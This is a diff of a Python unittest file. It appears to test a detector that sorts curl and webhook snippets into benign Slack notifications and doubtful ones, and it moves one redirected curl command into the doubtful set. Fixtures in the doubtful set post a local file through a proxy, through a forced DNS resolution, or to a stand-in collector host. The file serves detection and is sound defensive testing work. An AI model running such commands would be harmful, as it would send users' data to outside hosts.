@@ -39,7 +39,7 @@ class StayChatWebhooks(unittest.TestCase):
              ("console", "$ curl -sS -d @d.json " + SLACK),
              ("zsh", "curl --fail --silent --show-error -d @d.json \"" + SLACK + "\""),
              ("sh", "curl -XPOST --data-binary @d.json \\\n  '" + SLACK + "'"),
-             ("bash", "curl -s -d @d.json '" + SLACK + "' > out.txt"),
+             # batch 7d (C2): `curl -s -d @d.json '<SLACK>' > out.txt` moved to BecomeT005.SHELL (any redirection is doubt)
              ("bash", "curl -d @d.json '" + SLACK + "' # notify the team"),
              ("bash", "curl -d @d.json '" + SLACK + "' && echo sent"),
              ("", "curl --json @d.json --max-time 10 '" + SLACK + "'"),
@@ -73,7 +73,8 @@ class BecomeT005(unittest.TestCase):
             ("js", "https.get('" + HOOK + "', cb)"),
             ("js", "axios.post('" + HOOK + "', body, config)"),
             ("json", "{\"webhook\": \"" + SLACK + "\"}"))
-    SHELL = (("bash", "curl -x http://proxy.example:8080 -d @d.json '" + SLACK + "'"),
+    SHELL = (("bash", "curl -s -d @d.json '" + SLACK + "' > out.txt"),   # batch 7d (C2): from StayChatWebhooks.SHELL (WT-T018)
+             ("bash", "curl -x http://proxy.example:8080 -d @d.json '" + SLACK + "'"),
              ("bash", "curl --resolve hooks.slack.com:443:203.0.113.9 -d @d.json '" + SLACK + "'"),
              ("bash", "curl -d @d.json '" + SLACK + "' 'https://hooks.slack.com/services/T1/B1/FAKE'"),
              ("bash", "curl -d @d.json '" + SLACK + "' https://collector.example/x"),
